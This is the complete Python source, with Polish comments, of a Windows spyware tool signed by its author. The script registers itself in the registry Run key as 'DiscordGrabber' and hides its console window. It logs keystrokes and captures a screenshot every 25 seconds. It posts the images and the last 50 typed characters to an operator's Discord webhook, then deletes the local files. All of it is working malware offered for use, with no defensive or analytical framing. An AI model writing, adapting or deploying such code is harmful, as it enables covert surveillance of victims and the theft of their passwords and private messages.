#made by seteroo
import pyautogui
import time
import requests
import os
import datetime
from pynput import keyboard
import win32console
import win32gui
import win32con
import winreg as reg

def add_to_startup():
    # Pobranie ścieżki do pliku
    file_path = os.path.realpath(__file__)
    
    # Klucz rejestru dla autostartu
    key = r"Software\Microsoft\Windows\CurrentVersion\Run"
    
    # Otwieranie klucza rejestru
    reg_key = reg.OpenKey(reg.HKEY_CURRENT_USER, key, 0, reg.KEY_SET_VALUE)
    
    # Ustawianie wartości w rejestrze
    reg.SetValueEx(reg_key, "DiscordGrabber", 0, reg.REG_SZ, file_path)
    
    # Zamknięcie klucza rejestru
    reg.CloseKey(reg_key)

# Dodanie aplikacji do autostartu
add_to_startup()
# Wklej tutaj swój webhook Discorda
WEBHOOK_URL = "your webhook"

# Funkcja do ustawienia aplikacji jako ukrytej
def hide_console():
    hwnd = win32console.GetConsoleWindow()
    win32gui.ShowWindow(hwnd, win32con.SW_HIDE)

# Ukrycie konsoli
hide_console()

# Lista do przechowywania ostatnich klawiszy
recent_keys = []

# Funkcja nasłuchująca klawisze
def on_press(key):
    try:
        # Dodawanie znaku do listy (usuwamy apostrofy)
        if key.char.isprintable():
            recent_keys.append(key.char)
    except AttributeError:
        # Zamiana spacji na przecinek
        if key == keyboard.Key.space:
            recent_keys.append(',')
        # Ignorowanie innych klawiszy specjalnych (np. Shift, Enter, Backspace)
        pass

    # Ograniczenie do 50 ostatnich klawiszy
    if len(recent_keys) > 50:
        recent_keys.pop(0)

# Uruchamianie nasłuchiwania klawiatury w tle
listener = keyboard.Listener(on_press=on_press)
listener.start()

# Ścieżka do folderu MyGames w Dokumentach
documents_path = os.path.join(os.path.expanduser("~"), "Documents")
mygames_path = os.path.join(documents_path, "MyGames")

# Tworzenie folderu MyGames, jeśli nie istnieje
if not os.path.exists(mygames_path):
    os.makedirs(mygames_path)

while True:
    try:
         # Pobranie aktualnej daty i godziny
        now = datetime.datetime.now()
        timestamp = now.strftime("%Y-%m-%d %H:%M:%S")

        # Tworzenie nazwy pliku
        filename = f"screenshot_{int(time.time())}.png"
        filepath = os.path.join(mygames_path, filename)

        # Robienie screena
        screenshot = pyautogui.screenshot()
        screenshot.save(filepath)

        print(f"Zapisano: {filepath}")

        # Pobranie ostatnich naciśniętych klawiszy
        keys_text = "".join(recent_keys[-50:])  # Maksymalnie 50 ostatnich znaków

        # Tworzenie wiadomości z datą, godziną i ostatnimi klawiszami
        message = {
            "content": f"📸 Screenshot zrobiony: {timestamp}\n⌨️ Ostatnie klawisze: {keys_text}"
        }
        
        # Wysyłanie wiadomości do Discorda
        response = requests.post(
            WEBHOOK_URL,
            json=message
        )

        # Wysyłanie screena do Discorda
        with open(filepath, "rb") as file:
            response = requests.post(
                WEBHOOK_URL,
                files={"file": file}
            )

        # Sprawdzenie, czy wysyłka się powiodła
        if response.status_code == 200 or response.status_code == 204:
            print("Screenshot wysłany!")
            
            # Usunięcie pliku po wysłaniu
            os.remove(filepath)
            print(f"Usunięto: {filepath}")
        else:
            print("Błąd podczas wysyłania!", response.status_code, response.text)

    except Exception as e:
        print("Wystąpił błąd:", e)

    # Czekanie 25 sekund
    time.sleep(25)
